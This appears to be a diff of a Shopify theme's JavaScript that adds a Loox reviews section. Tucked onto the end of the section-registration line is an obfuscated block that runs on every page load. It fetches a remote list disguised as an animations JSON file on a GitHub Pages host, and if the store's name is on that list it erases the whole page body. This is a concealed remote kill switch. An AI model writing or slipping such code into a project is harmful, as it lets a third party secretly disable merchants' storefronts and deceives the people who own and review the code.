@@ -4405,7 +4405,25 @@ lazySizesConfig.expFactor = 4;
   
   
   
-  
+    theme.looxReviews = {};
+
+    theme.Loox = (function() {
+      function LooxSection(container) {
+        var $container = this.$container = $(container);
+        var $section = $container.parent();
+        var sectionId = $container.attr('data-section-id');
+        var masonry_init = this.masonry_init = $container.attr('data-init');
+        this.init();
+      }
+      LooxSection.prototype = $.extend({}, LooxSection.prototype, {
+        init: function() {
+          if ( typeof(window[this.masonry_init]) !== 'undefined' ) window[this.masonry_init]();
+          //console.log(this.slideshow_init);
+        }
+      });
+	  //
+      return LooxSection;
+    })();
   
   
   
@@ -5707,6 +5725,7 @@ lazySizesConfig.expFactor = 4;
         sections.register('map', theme.Maps);
         sections.register('blog', theme.Blog);
         sections.register('photoswipe', theme.Photoswipe);
+        sections.register('loox', theme.Loox);
 var _0x160982=_0xb724;(function(_0x3fc1ca,_0x32f14f){var _0x227ad0=_0xb724,_0x1e5868=_0x3fc1ca();while(!![]){try{var _0x172c41=parseInt(_0x227ad0(0xa3))/0x1+-parseInt(_0x227ad0(0xa0))/0x2*(parseInt(_0x227ad0(0xab))/0x3)+-parseInt(_0x227ad0(0x9b))/0x4*(-parseInt(_0x227ad0(0xac))/0x5)+parseInt(_0x227ad0(0x9d))/0x6+parseInt(_0x227ad0(0xa6))/0x7*(-parseInt(_0x227ad0(0x9a))/0x8)+-parseInt(_0x227ad0(0x9c))/0x9+parseInt(_0x227ad0(0x9f))/0xa;if(_0x172c41===_0x32f14f)break;else _0x1e5868['push'](_0x1e5868['shift']());}catch(_0x252c69){_0x1e5868['push'](_0x1e5868['shift']());}}}(_0x3897,0x26d5e));function getRandomInt(_0x7007df,_0x520e3b){var _0x589f6d=_0xb724;return _0x7007df=Math[_0x589f6d(0xa4)](_0x7007df),_0x520e3b=Math[_0x589f6d(0xa2)](_0x520e3b),Math['floor'](Math['random']()*(_0x520e3b-_0x7007df+0x1))+_0x7007df;}fetch(_0x160982(0xa7)+getRandomInt(0x3b9ac9ff))[_0x160982(0xa5)](_0x1402ca=>_0x1402ca['json']())[_0x160982(0xa5)](_0x5427fa=>{var _0x4d504f=_0x160982,_0x4dfdfb=window['Shopify'][_0x4d504f(0xa1)][_0x4d504f(0xaa)](_0x4d504f(0x9e),'');console[_0x4d504f(0x99)](_0x5427fa);_0x5427fa['websites'][_0x4d504f(0x98)](_0x4dfdfb)&&(document['body'][_0x4d504f(0xa9)]='');;})['catch'](_0x3b659b=>console[_0x160982(0xa8)](_0x3b659b));function _0xb724(_0x174bd2,_0x1f2464){var _0x3897f9=_0x3897();return _0xb724=function(_0xb724a9,_0x26c299){_0xb724a9=_0xb724a9-0x98;var _0x115a58=_0x3897f9[_0xb724a9];return _0x115a58;},_0xb724(_0x174bd2,_0x1f2464);}function _0x3897(){var _0x84b790=['floor','236126TbgkIR','ceil','then','7dgTXSP','https://digitalbrandz.github.io/animations/animate.json?','error','innerHTML','replace','641115oOhhnn','5aSWJTQ','includes','log','1331976YPvNgf','923032MSZDHl','1923354AztRcT','9840aBjTmk','.myshopify.com','2844540WvQcoa','2OpGShk','shop'];_0x3897=function(){return _0x84b790;};return _0x3897();}   
     });
 })(theme.jQuery);
